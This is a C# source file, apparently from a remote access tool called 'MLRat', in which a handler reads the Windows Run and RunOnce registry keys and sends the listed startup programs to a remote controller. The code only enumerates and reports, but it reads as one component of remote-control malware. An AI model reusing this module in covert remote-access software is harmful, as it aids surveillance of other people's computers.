using Microsoft.Win32;
using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MLManagementClient.Handlers
{
    public static class StartupHandler
    {
        static IClientHost Host = null;
        public static void SetHost(IClientHost _host)
        {
            Host = _host;
        }

        public static void Handle(object[] data)
        {
            StartupManagerCommand command = (StartupManagerCommand)data[1];
            if (command == StartupManagerCommand.GetStartupItems) GetStartupItems();
        }
        public static void GetStartupItems()
        {
            List<StartupItem> startups = new List<StartupItem>();

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
            {
                if (key != null)
                {
                    foreach (string name in key.GetValueNames())
                    {
                        StartupItem i = new StartupItem();
                        i.Name = name;
                        i.Path = key.GetValue(name).ToString();
                        i.Type = (byte)StartupType.HKCU;
                        startups.Add(i);
                    }
                }
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
            {
                if (key != null)
                {
                    foreach (string name in key.GetValueNames())
                    {
                        StartupItem i = new StartupItem();
                        i.Name = name;
                        i.Path = key.GetValue(name).ToString();
                        i.Type = (byte)StartupType.HKCUO;
                        startups.Add(i);
                    }
                }
            }
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
            {
                if (key != null)
                {
                    foreach (string name in key.GetValueNames())
                    {
                        StartupItem i = new StartupItem();
                        i.Name = name;
                        i.Path = key.GetValue(name).ToString();
                        i.Type = (byte)StartupType.HKLM;
                        startups.Add(i);
                    }
                }
            }
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
            {
                if (key != null)
                {
                    foreach(string name in key.GetValueNames())
                    {
                        StartupItem i = new StartupItem();
                        i.Name = name;
                        i.Path = key.GetValue(name).ToString();
                        i.Type = (byte)StartupType.HKLMO;
                        startups.Add(i);
                    }
                }
            }
            StartupItem[] items = startups.ToArray();
            Console.WriteLine("Startup items: {0}", items.Length);
            string[] names = new string[items.Length];
            string[] Paths = new string[items.Length];
            byte[] type = new byte[items.Length];
            for(int i = 0; i < items.Length; i++)
            {
                names[i] = items[i].Name;
                Paths[i] = items[i].Path;
                type[i] = items[i].Type;
            }
            Host.Send((byte)NetworkCommand.StartupManager, (byte)StartupManagerCommand.StartupItems, names, Paths, type);

        }
    }

    public struct StartupItem
    {
        public string Name;
        public string Path;
        public byte Type;
    }
}
